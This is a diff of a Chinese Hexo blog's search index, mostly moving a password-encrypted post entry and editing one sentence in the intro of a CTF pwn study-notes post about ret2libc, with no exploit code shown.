f5631bb178b2acf4625c2f3a3c36aacc13bbc934bf262f977dd314b3060054b7c4fb0e451591c3c9da453120d475476716fe7b866e3e5fa549046afbb46c297d28f59d787cbbfbd683222ff8f4fd3feaac66d07deea57d182728946fff6247af7a2e78252e9bc3bd61958197b0642ded757fe89f782e41588e6e3c4e70e43571eb4a2c8759956cffe50b1d08332a3a9f657810ae5706d3ad8fd908ec50599a0e3ce521b9ac89040381b11ebcc20656511cced3d927a8e6a6b4194cd1d5e95a1ffb63cea0b804d93766b1c623d97086b3f0e24565c70fbf705b5c8d13c2239675262d62d772a7bffcf0cdd5de2a9d32987b74ff25d024544b6ba22f0711e71dab69ebc3d2a05852bd133ddbc19b989d5656458203abef046ccc03436e1299f052eeaa7974fcd71c3774d519e9fd5a98f464c10bc9d21bf44b4e42adab89375acea86a164dff06c7081e6ec1c612eb0047ac441fbc77bdf7c64027320d3405afa3e11a6bde3248fc5dbb10bcb9b33b69e2e96b1cdd8e168fac3718a56a6a7094f005e3398c0167fc9b5d920344d1e57afd6328a8e09cd6dbf6144af4e05d64fe3bdaa877f30cc468caf21dca955f4e60e26bc89f370b88626c8437ba2815a0ad397f35ed930deb21d35abce4c733d9e70129c7365ad77a69bb8292c0da83d0a61e714e91e5b207e092c4ed5e7f79d6edebae61ae38e480ebf3987deba8f178fea1bc08356a652c44f5ef1513bc55c64859eb04752f88157eaa22c6ea8a79085ce05d0480d4a8cb8a187a62dd08e95a93bd0ad9f404f0e8351a12806100ea49877b96987f60a7db65a64d46f90ff682d3fb6ca6a981b57928fa5bfb7c033af02856312bda9b4c616cd5d45ae608ecb3ee9df5fc7fa563cd4c804bc836d9e82483c20ae99a9195cc0e39fa76998c90a9a3de08f851e5d84e354655b646cdff857e78df312180d4c758bee15bc305028cf1ebf214120fb4e1f0dc6665557363cd8de0db062efb9c03e0377a5626e1ac4ac391de682cd7066e508667425a4342bc896a0b9ade51499d00317173d92e6d6a1b50e98fc077a1f92465b522abbc6c0b9bf8ba3ba78032c88a01ea651929b9eed6c44122949a87f19a678971b22ab61d6ebd70b9cbae5ae33d2e2964678825c8a410efcf0cb6c0051074f7328a0b5339827af840e77c3f60d10c19c3b9a363bf471dd4fadf9f591443a27d1d7d53b75dd47aaa3a8289b2b1b0370bf42064a555f33a1a4abb52657e1075e6d811cd932f942efcf999529db5fbf6c9ee75ac071e5767ead67a2502c2431c0f6dd456559a7ed71cfa451b231c5476551589f13ebba15c946333b08aea9b4284c122548a8a4f5705ec720aac8fcdc7ddc3d7e7511b0ec84bff47c2d621f68f0354187542219f2798cbd82931327fed20ad51246c2109102c295ee1232c20c7364b826e2312ed26a2e9bed57992eaae0f36ee6a78944501c6e7e987a0e684a9cbbd87e65b0c163cd73d2a7e420afeda2b39f713408af4a9fa859f03f288a8e988c3d009ff6be1d6f83d9d5734c82f36eb6d7c888c69e11ded1a9127c1096a11e4170ab5465bf9625c6235fd82445589a24381fac0b3ba2981849230e1811bde094831f54a4dfac00f33a11c5f24833a188565b1324e2735e809a1d28d084f7029f3422f0236e5e0ece349f928343228d418af85ae2f6962c6cf3629bfd0f352caff623cb3c9c4a8d1770ac510b49521c0cb4a5995016a1f0aecd3318aac44902d8c69564afa4e134985c4223ee852cd3c328ab72168188df0dc6bcb764eb8bd8c97a91ad9d96fa56335a6e00b99663e354a43eb4d405765a97a01f6c69441ce5c1d58d09c516ce536060090709b21c1e4add916a052cf2187920ef8d7c4f45d92033951eca0f87287b82f135979fbaa63a3b21af60cb0019b9e7d918bfb6d36a6dc586e9e4323c7895cc3a854638436aac54a24d7bcbdd90239f7ff652c94576ac94ff28219f6433e91d515924822c126eae7104962c31e03095f000a9734bae9f9592a14f0cf028aaada990d955951cea36d8f0e669804cf081fc71d97d2decda0944dbc839bd569b064656ea41b664d11ae3d90da678b1d0cf4cc7c071973f6cc42076a65e60f83d8accc5e248335dbc49d57632ea3d1a65f5dbad703147b82ea65d27251d28976ee417434bd016d490368da9a58ec263ae5b8daddf550e7f5891d45fe2f810e9e023571e913f44c573460babdb98dcaefd48a3816284499edabec0cd98a8ebcf6344e70b199e092917be7ecc1af0ccbeee596293c590ea5d7086f096bbff7c4f222dd23c451ac987c7f3330d219c179c1d7d222e41ba4286fbea8377286d817ef648b6a6277d83d4150c5194eb7b61ecd03da9494ccf46bd20bf819fa8faa4064e1681bf17ed6593a98550adcb80b6d1490b81defa1d5040ea32677a11b725deb3d6c0fc9f1521bee222efaf86c5f51a199c2d2bb9ec631275ec0931dc864175d796913b056083c2a05e8f2508687c5dba1f88a08258bf356a77e968f250629d260812e99b75805472db2cc573d51d14850b362e506c4a2a44b52996bbf05bcc1bae5bbca0bd278f37c3c87d3a54e7d17c2f4fdadbe547c106226fabd07a7aff30cb88378ad8a1be8b13035235153ef8bd45dfd392da28f2d6de010c86134bd5dd88a306a9f20205f93eb4b8baa80eec7bc3af19300a4fa6d2712d9cc738055413aeb14d2d6dcacf9ccc4e84ec1c5a9bb33b0e0180ec0c63abad511fbf8960cf68d7d4f5eb5e5fc65e29f93b47377597d6013da0a685163780ad08f130eb7a1086bf2222ebe00235052d4513a0f95b2f827369eb4ecf4de63e7612bf7d0bc4b78fd3530457a54bb7b8427b4c5936c4880f2adfdf57c6c9953c6896353d9fe119a8ccd95a2166c7b2b37e4cb38016c6437d71fd02c16b877419733b3ad383e83d409bde72a513d6a7070ec2b563ce59052920a4b7dd0bab5e11992a9c747a18029b60849d938b5b8abd796448009501a806ac4085c0bec77dd2452efb0671ae647a254690ce031573405e2db1723a4acfd2b3f4d6dae6c709dc2603fbb15fdb3455a0d115813547a9731ef682d737f3e3f7e319656d67a8ed05bc206cda69ffa54e9923d68f09e737e568ef873ff532abf73e5c44fdfe69f11bfff2ef84d00a22646f6789ba377b5abe667ee7aa1ea0cb4bffcfc7dc8b90bbb31a01bfcde727a3bd1aaf1d95cc3a44ea413b2af1f17310de94f267fbe064e6218e44eb7d0dc44d0856be4ee16923405d359f64563f4875deac9c30457679cb78bde01e42cbb88310fa153c47cc65029745f99acafd35992e4cda99db3a07a1b3c2ac3c6a842fab2c5f12c708883be386de9371bdaf7643ef1d5597ac7337055fc34d46c823fc033abdb52f1d7c59a9de581c32ae367359985649760e66b5d8c871d4344bfec8a9282992aa714d28962b9c8a6cabcdbdd7770b262c74b57e0cd8b1f4b5183b2bcd4917594c265921bf8882f43626fc7aa33bf93d592529374db471d3d0a99a9168243df4b55e298a22978e45d90b0c71deaed7ce0de7073a77c912efc1db00104ca6aec51d78db90f115ba88a39d0988add312169702a2d2d13b2bea0bd08b33725c3e0749e73f4ae8ea008d61f3ae364c999836feea8f522124635a9da460f2137298441f548e8bb158ae21bb98f736f9b3559e5981bc4c36fbf43789f1c730412e492a259b5e9591141757646f41c1aa31cc8a6bcfc130ead7a275532f53664285dc3bb870875b3c1cca594b63ba5133ef843e557ad376306d8969adf5ae210841383f98ddc4bbf3a24c0952d25ea47a1b93ddf2da99e8dd86356764fd0e7081272c7d38f4f73154b0c8e94c8e7ecf6c4531caf313cff754a6dd27bfcae954ee0d5855b1665027a5c7e28c1ea1aab5160d18a159a10d42e7a8bb4f6c6a85e2b74d5235a2211b5a0608c53ee2d40f50ea5a15c80275d373273bd96a66ddedcf81185a3f2f04b74a6ab8730f321fe985c89442238947b3ec54a81afdb737bfa0e0746ec58ce354f9fa7e663e13b651100780535c4bfd284b00c824a4be3a77116962ed4b5f4bcd32b345f16e41ba0a32b04514e8ca29eb079bba0a639666aa5a647a27b5c0ae033d88badf7a20e8508435efff5270aba528b2c13d1e77c8027a52f7031992209c4fd19b16d0fff672c567705676263644c7884b51255bd04bb9fe5547b5217b244acad43db7691b72ffb19e61e22952456061c9ed3307858fecee0dfacfc477a8cbf0a70a97a01ca48542740bf49b4e857bdc131b79d14b3ab78c490b0b755ee2a0853e4e12ecd1d724572181cf3e0ae193242e75248cc4610f19379afeef93384bb23f77e1e97d05be3951d2950bb421fb2267972835ca7b1a9d720ccf937d20b084c0ddbb8561d391937139339aea5911ea90cb85b38c37dba814b9ead284184ac7f81f5ea0526c904680b179164c84407e1e2a43818f7dbde162b66f13b77a64a9cfa49d6dd389af4c8d41f467808b59318f25182e593034d533994664456ae17249624e47649570418f9e72f993c47ce6d2e96814b1ade3cbdda9d12950f3051966a81c43e86cb56ff85762eeb31e9b85798ca2a608acad8be8d0ce8c9543a81a15645eae4318e6e7744c9e2f5610f2802d4ad1b5cef2da0bc520f5860d68a5eb20080ef36bafe2c8d8efc3159f9e03c6750472c9a8f891342d9e40438ca39d2201399f18a2de55f6bec0a30a1ecb328833a2768743e0d86a76b108901bd5ca87babf78c9dcea27df672d7e41d7aff9158ea6b84401b1dccfe1b554ea0a74efba8813bf8d1f9bb5374bc06bf0a61eac760952a3a72df25e0c257b39c5fa5afd095290c1459ed22bc987938fb8f2cf815fbfa5acb2fa46514e684f466af0486f0e0bd28a8255cb7e27bba7035563c6ce69b065aa28ebd5f8117091699b6581339bfa205e9460b4ccda699a98be39862d5a6630dd4700983c8e6be9e1f5c77a2c5e0df5df9337d8873546436504ea35db33122ddadcee9d68bda96389a8d5490c12e2cc03173a251923b441d2fa5b6965309c60014a3d17a8a1cdcbdaf30c4685c8de8b809849899daeaecf19dcfde954d5bcc60789d19c51180c43f2d9ebf5dc6b0c5c9e03fc548d9174329bde4e9d916cb166a8643d117a516b16343b02d2697ccc4fd33c5b244f738ec9ec392f21b41547f254baa468db5251f1a8ab999e72603bcc3dccdbaa92f4baa5d32a3addcc72ac5c6c28b0b281a9d56c5ea6fb491ac6a765c8ad71772e5e372b5cc3f303b6a1bc2490e4363b9d980391e397539c0524ce445f3556a0c0728e1fb7b9b3009ce9b0cdecc3ca12733ed7e8feb42ddb68be9d7e99c12829636aac6906ca57da9b3c8d</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>encrypted</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第一篇博客</title>
     <url>/2018/11/30/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="第一次见面"><a href="#第一次见面" class="headerlink" title="第一次见面"></a>第一次见面</h2><p>你好，同学！欢迎你使用基于hexo搭建的next主题的博客系统。</p>
@@ -2862,28 +3005,6 @@
       <categories>
         <category>随笔</category>
       </categories>
-  </entry>
-  <entry>
-    <title>（置顶）碎碎念</title>
-    <url>/2038/01/19/%E7%A2%8E%E7%A2%8E%E5%BF%B5.html</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="4d569429e40884b6b1499ac4e7e93ff0391e45b21bdac07692bf36ab8f7fa3d8">6fcf1523ddce79b7eefea9a75525b5245de786104bf519d9988408b867bdf551bd0c68bfb36652de0234a851b59b631ffe9d78a9e0290bfff0952c565a4257c23f889a6206ebd9cee2e4e4b13fb740ec32d5f036c78c189b8c30cd311f0c44bcdf9ddedfd6c66bfdfc2bb4a0a23eb7a62d13e83184952540545ea7150454871ae24d80818cfeeb6aa2471f860b72b98c56bbbd4702503971a324dd6df6dd21507ec37799310b591df3f60c43021e13c24c306c1bd047d188eda2c534bb899685046131a268390326c442e9b92300fba7c5e795cd9656b2583900e08e83af6cdebba87ed3eb840c9a0930d0840b98b55775745e3a51ed3b8799fc0fb35ba9aaa30609febde5b587e16d318882d844c49395260b433fbcad4aa40ee1c13c8c92c12a0892c6c237eecd9219b0e7122d178d381fc417eb0a5589e3cdc7952dd32b28a41e36049c43e319e754e9980639dde30bfb93355680b1c2505a33f169d095d830a4d28c7532be7fca77c07874b91105ab49c4cd4d61a06d17a228640d0d7ffa099150fb87ddbac1de725b6bfebf796451f0fd7ac28cd7c44c9d347963e7201aad7534b0dbf27fc01897faf5768a6b64d80c84ac14486b4e7c5706b2af565de95f5ac16fe41c3600e0fa62941820f1bf5615f78821f2f805e77755c267d22e8839884b0352a118197c583aefe1ac5aea9d7b39ff0a1fa7bc45eca0a3488a838c8559f957de4e3acee2bbb760dc606acf3ea2baeeeab18dcafeeda776b48fce26861b6413a746aec1dcd2e9aa45a4b2131885ecb6342b8bcfd3e55b8458efd91bb46cebeb11b9fa8184977eb4e0e6e1b9f6aac03ef139cd0cf6da6900f414f76286c4dcf1c909d79b212c90b0721ad0846ac574cefba3b6b7ecf0ca48fc6ed75da87a32519e0b83f5cf44fa4c92b62e55a6d081c3e2a62962387f3096d1da53e0a68e002b7e8d510a8926a7ffc6e306b2cbaa49aadfd7d778a50238602caa7df4a9c31a6907c29b489053c8c51976c07886f64c61f8f15fa45a588dcf12ef998d402b7702f2b2afc60133d0faa42e3f301099ba94db72e5fcf08609464c40226671ff8b317500be2ad8c15af42d10816707ca05fbcf51f480697d3e629e5c8f87f86a9f7d640e3d9b546c71d69ae554c3d7d5cdcca206b839f33a5c5f01cf4feacf8d53830c2baa99fd62d3078eb7928a2f4f57a2c4e35095a181bf1c9c3fe2203ae11e79f6269ec44074171e5f9ce3bc60648582db3aaab5370380029f26fdaebb6f77a58c37dce80a73a03a7cd7b4c86ce0566b49c6a54dbdef467b64c3a8efd7e95e2b8c28408c70322fdac6f65182a2e6d6579201308690964cec516ab9c1714103a65e1ae83dab841158788fa07439e2477409e598f5081e9dedb5bd914d77fa5a5ed1e24100fe78f4a8f9fe036548a9394544668039dfbc1ca0e3194718907c66806a43b75198a465eff526439f742a40bc296f440d89fed0f037b27f32a074da98f10c0f683b12aeb0fcc669e1d63309c9059386d6653e65b4db65d604673803170d4464fcded8365a22791513c9659ab8bb0eaf218945b777492d13b5b5292b9bf767afda1bb53c1e7d3a38963c42e7ea958b4e265bd01db8db569dde6392df47d4b600408e21c732987b77758c4ee1a6c84ed570f061ee27cbb4edca30dada520ef7ee2a2b7942a769000d596405178a140ea237a5e6dd3b96e26846540e6f8028351f47e6c7b94f0afed976045c6724b2f72579490138f86207cfa9cfae445761ed93f43c902a843430bfdc2b2ce77f188eee2f00024efdbc3b7f913a2c5384e1c231834af501f3dc641fa5574b3609e3bb5b2de0174a08493b0eccd96d211f4917265146170d3beed8549926638cbfa27232e5c71fb39c8b4251c28baa1ca880cae7804ecb217c5c3579d684db2407f13f30da0c45c9f0463e5ab1c81d5ba3800805cfecae464504d8d62678ab29f5affceae179418cd9d2a78e35bd319064154c036b191449a18732c9f168773d488b3d0ed4097bed5ff33feecc2110ca4bac4105e5e53f6c80f5465bf3da7e79dee5f2a01e4a626fd5111507b640dd144243eab70a6f55b20b3e46579b393ae5e3d39d4be3a5f4f1dc8e024fa3ffd2084b2c2fc85ec39e001fdc67d4749fea3b46b45a158e97f6ba3ceb50bf11b024d617aaebff5631bb178b2acf4625c2f3a3c36aacc13bbc934bf262f977dd314b3060054b7c4fb0e451591c3c9da453120d475476716fe7b866e3e5fa549046afbb46c297d28f59d787cbbfbd683222ff8f4fd3feaac66d07deea57d182728946fff6247af7a2e78252e9bc3bd61958197b0642ded757fe89f782e41588e6e3c4e70e43571eb4a2c8759956cffe50b1d08332a3a9f657810ae5706d3ad8fd908ec50599a0e3ce521b9ac89040381b11ebcc20656511cced3d927a8e6a6b4194cd1d5e95a1ffb63cea0b804d93766b1c623d97086b3f0e24565c70fbf705b5c8d13c2239675262d62d772a7bffcf0cdd5de2a9d32987b74ff25d024544b6ba22f0711e71dab69ebc3d2a05852bd133ddbc19b989d5656458203abef046ccc03436e1299f052eeaa7974fcd71c3774d519e9fd5a98f464c10bc9d21bf44b4e42adab89375acea86a164dff06c7081e6ec1c612eb0047ac441fbc77bdf7c64027320d3405afa3e11a6bde3248fc5dbb10bcb9b33b69e2e96b1cdd8e168fac3718a56a6a7094f005e3398c0167fc9b5d920344d1e57afd6328a8e09cd6dbf6144af4e05d64fe3bdaa877f30cc468caf21dca955f4e60e26bc89f370b88626c8437ba2815a0ad397f35ed930deb21d35abce4c733d9e70129c7365ad77a69bb8292c0da83d0a61e714e91e5b207e092c4ed5e7f79d6edebae61ae38e480ebf3987deba8f178fea1bc08356a652c44f5ef1513bc55c64859eb04752f88157eaa22c6ea8a79085ce05d0480d4a8cb8a187a62dd08e95a93bd0ad9f404f0e8351a12806100ea49877b96987f60a7db65a64d46f90ff682d3fb6ca6a981b57928fa5bfb7c033af02856312bda9b4c616cd5d45ae608ecb3ee9df5fc7fa563cd4c804bc836d9e82483c20ae99a9195cc0e39fa76998c90a9a3de08f851e5d84e354655b646cdff857e78df312180d4c758bee15bc305028cf1ebf214120fb4e1f0dc6665557363cd8de0db062efb9c03e0377a5626e1ac4ac391de682cd7066e508667425a4342bc896a0b9ade51499d00317173d92e6d6a1b50e98fc077a1f92465b522abbc6c0b9bf8ba3ba78032c88a01ea651929b9eed6c44122949a87f19a678971b22ab61d6ebd70b9cbae5ae33d2e2964678825c8a410efcf0cb6c0051074f7328a0b5339827af840e77c3f60d10c19c3b9a363bf471dd4fadf9f591443a27d1d7d53b75dd47aaa3a8289b2b1b0370bf42064a555f33a1a4abb52657e1075e6d811cd932f942efcf999529db5fbf6c9ee75ac071e5767ead67a2502c2431c0f6dd456559a7ed71cfa451b231c5476551589f13ebba15c946333b08aea9b4284c122548a8a4f5705ec720aac8fcdc7ddc3d7e7511b0ec84bff47c2d621f68f0354187542219f2798cbd82931327fed20ad51246c2109102c295ee1232c20c7364b826e2312ed26a2e9bed57992eaae0f36ee6a78944501c6e7e987a0e684a9cbbd87e65b0c163cd73d2a7e420afeda2b39f713408af4a9fa859f03f288a8e988c3d009ff6be1d6f83d9d5734c82f36eb6d7c888c69e11ded1a9127c1096a11e4170ab5465bf9625c6235fd82445589a24381fac0b3ba2981849230e1811bde094831f54a4dfac00f33a11c5f24833a188565b1324e2735e809a1d28d084f7029f3422f0236e5e0ece349f928343228d418af85ae2f6962c6cf3629bfd0f352caff623cb3c9c4a8d1770ac510b49521c0cb4a5995016a1f0aecd3318aac44902d8c69564afa4e134985c4223ee852cd3c328ab72168188df0dc6bcb764eb8bd8c97a91ad9d96fa56335a6e00b99663e354a43eb4d405765a97a01f6c69441ce5c1d58d09c516ce536060090709b21c1e4add916a052cf2187920ef8d7c4f45d92033951eca0f87287b82f135979fbaa63a3b21af60cb0019b9e7d918bfb6d36a6dc586e9e4323c7895cc3a854638436aac54a24d7bcbdd90239f7ff652c94576ac94ff28219f6433e91d515924822c126eae7104962c31e03095f000a9734bae9f9592a14f0cf028aaada990d955951cea36d8f0e669804cf081fc71d97d2decda0944dbc839bd569b064656ea41b664d11ae3d90da678b1d0cf4cc7c071973f6cc42076a65e60f83d8accc5e248335dbc49d57632ea3d1a65f5dbad703147b82ea65d27251d28976ee417434bd016d490368da9a58ec263ae5b8daddf550e7f5891d45fe2f810e9e023571e913f44c573460babdb98dcaefd48a3816284499edabec0cd98a8ebcf6344e70b199e092917be7ecc1af0ccbeee596293c590ea5d7086f096bbff7c4f222dd23c451ac987c7f3330d219c179c1d7d222e41ba4286fbea8377286d817ef648b6a6277d83d4150c5194eb7b61ecd03da9494ccf46bd20bf819fa8faa4064e1681bf17ed6593a98550adcb80b6d1490b81defa1d5040ea32677a11b725deb3d6c0fc9f1521bee222efaf86c5f51a199c2d2bb9ec631275ec0931dc864175d796913b056083c2a05e8f2508687c5dba1f88a08258bf356a77e968f250629d260812e99b75805472db2cc573d51d14850b362e506c4a2a44b52996bbf05bcc1bae5bbca0bd278f37c3c87d3a54e7d17c2f4fdadbe547c106226fabd07a7aff30cb88378ad8a1be8b13035235153ef8bd45dfd392da28f2d6de010c86134bd5dd88a306a9f20205f93eb4b8baa80eec7bc3af19300a4fa6d2712d9cc738055413aeb14d2d6dcacf9ccc4e84ec1c5a9bb33b0e0180ec0c63abad511fbf8960cf68d7d4f5eb5e5fc65e29f93b47377597d6013da0a685163780ad08f130eb7a1086bf2222ebe00235052d4513a0f95b2f827369eb4ecf4de63e7612bf7d0bc4b78fd3530457a54bb7b8427b4c5936c4880f2adfdf57c6c9953c6896353d9fe119a8ccd95a2166c7b2b37e4cb38016c6437d71fd02c16b877419733b3ad383e83d409bde72a513d6a7070ec2b563ce59052920a4b7dd0bab5e11992a9c747a18029b60849d938b5b8abd796448009501a806ac4085c0bec77dd2452efb0671ae647a254690ce031573405e2db1723a4acfd2b3f4d6dae6c709dc2603fbb15fdb3455a0d115813547a9731ef682d737f3e3f7e319656d67a8ed05bc206cda69ffa54e9923d68f09e737e568ef873ff532abf73e5c44fdfe69f11bfff2ef84d00a22646f6789ba377b5abe667ee7aa1ea0cb4bffcfc7dc8b90bbb31a01bfcde727a3bd1aaf1d95cc3a44ea413b2af1f17310de94f267fbe064e6218e44eb7d0dc44d0856be4ee16923405d359f64563f4875deac9c30457679cb78bde01e42cbb88310fa153c47cc65029745f99acafd35992e4cda99db3a07a1b3c2ac3c6a842fab2c5f12c708883be386de9371bdaf7643ef1d5597ac7337055fc34d46c823fc033abdb52f1d7c59a9de581c32ae367359985649760e66b5d8c871d4344bfec8a9282992aa714d28962b9c8a6cabcdbdd7770b262c74b57e0cd8b1f4b5183b2bcd4917594c265921bf8882f43626fc7aa33bf93d592529374db471d3d0a99a9168243df4b55e298a22978e45d90b0c71deaed7ce0de7073a77c912efc1db00104ca6aec51d78db90f115ba88a39d0988add312169702a2d2d13b2bea0bd08b33725c3e0749e73f4ae8ea008d61f3ae364c999836feea8f522124635a9da460f2137298441f548e8bb158ae21bb98f736f9b3559e5981bc4c36fbf43789f1c730412e492a259b5e9591141757646f41c1aa31cc8a6bcfc130ead7a275532f53664285dc3bb870875b3c1cca594b63ba5133ef843e557ad376306d8969adf5ae210841383f98ddc4bbf3a24c0952d25ea47a1b93ddf2da99e8dd86356764fd0e7081272c7d38f4f73154b0c8e94c8e7ecf6c4531caf313cff754a6dd27bfcae954ee0d5855b1665027a5c7e28c1ea1aab5160d18a159a10d42e7a8bb4f6c6a85e2b74d5235a2211b5a0608c53ee2d40f50ea5a15c80275d373273bd96a66ddedcf81185a3f2f04b74a6ab8730f321fe985c89442238947b3ec54a81afdb737bfa0e0746ec58ce354f9fa7e663e13b651100780535c4bfd284b00c824a4be3a77116962ed4b5f4bcd32b345f16e41ba0a32b04514e8ca29eb079bba0a639666aa5a647a27b5c0ae033d88badf7a20e8508435efff5270aba528b2c13d1e77c8027a52f7031992209c4fd19b16d0fff672c567705676263644c7884b51255bd04bb9fe5547b5217b244acad43db7691b72ffb19e61e22952456061c9ed3307858fecee0dfacfc477a8cbf0a70a97a01ca48542740bf49b4e857bdc131b79d14b3ab78c490b0b755ee2a0853e4e12ecd1d724572181cf3e0ae193242e75248cc4610f19379afeef93384bb23f77e1e97d05be3951d2950bb421fb2267972835ca7b1a9d720ccf937d20b084c0ddbb8561d391937139339aea5911ea90cb85b38c37dba814b9ead284184ac7f81f5ea0526c904680b179164c84407e1e2a43818f7dbde162b66f13b77a64a9cfa49d6dd389af4c8d41f467808b59318f25182e593034d533994664456ae17249624e47649570418f9e72f993c47ce6d2e96814b1ade3cbdda9d12950f3051966a81c43e86cb56ff85762eeb31e9b85798ca2a608acad8be8d0ce8c9543a81a15645eae4318e6e7744c9e2f5610f2802d4ad1b5cef2da0bc520f5860d68a5eb20080ef36bafe2c8d8efc3159f9e03c6750472c9a8f891342d9e40438ca39d2201399f18a2de55f6bec0a30a1ecb328833a2768743e0d86a76b108901bd5ca87babf78c9dcea27df672d7e41d7aff9158ea6b84401b1dccfe1b554ea0a74efba8813bf8d1f9bb5374bc06bf0a61eac760952a3a72df25e0c257b39c5fa5afd095290c1459ed22bc987938fb8f2cf815fbfa5acb2fa46514e684f466af0486f0e0bd28a8255cb7e27bba7035563c6ce69b065aa28ebd5f8117091699b6581339bfa205e9460b4ccda699a98be39862d5a6630dd4700983c8e6be9e1f5c77a2c5e0df5df9337d8873546436504ea35db33122ddadcee9d68bda96389a8d5490c12e2cc03173a251923b441d2fa5b6965309c60014a3d17a8a1cdcbdaf30c4685c8de8b809849899daeaecf19dcfde954d5bcc60789d19c51180c43f2d9ebf5dc6b0c5c9e03fc548d9174329bde4e9d916cb166a8643d117a516b16343b02d2697ccc4fd33c5b244f738ec9ec392f21b41547f254baa468db5251f1a8ab999e72603bcc3dccdbaa92f4baa5d32a3addcc72ac5c6c28b0b281a9d56c5ea6fb491ac6a765c8ad71772e5e372b5cc3f303b6a1bc2490e4363b9d980391e397539c0524ce445f3556a0c0728e1fb7b9b3009ce9b0cdecc3ca12733ed7e8feb42ddb68be9d7e99c12829636aac6906ca57da9b3c8d</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>encrypted</tag>
-      </tags>
   </entry>
   <entry>
     <title>scuctf新生赛——幽篁终见天战队wp</title>
@@ -3938,7 +4059,7 @@
 <blockquote>
 <p>updated on 2022/10/23: </p>
 <p>buu前五页已经完成，该专栏将不再更新具体的思路与exp。</p>
-<p>接下来可能学一堆高版本的house系列，比赛的题解会单独开文章，并在对应的栏目添加文章链接。</p>
+<p>接下来可能学内核、高版本的house系列，比赛的题解会单独开文章，并在对应的栏目添加文章链接。</p>
 </blockquote>
 <span id="more"></span>
 <h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><h2 id="ctfshow-pwn-3-pwn03——ret2libc"><a href="#ctfshow-pwn-3-pwn03——ret2libc" class="headerlink" title="ctfshow-pwn-3: pwn03——ret2libc"></a>ctfshow-pwn-3: pwn03——ret2libc</h2><p>可以使用 <a href="https://libc.blukat.me/">https://libc.blukat.me/</a> 查询libc库的各函数地址，再根据偏移计算其他函数的实际地址。</p>
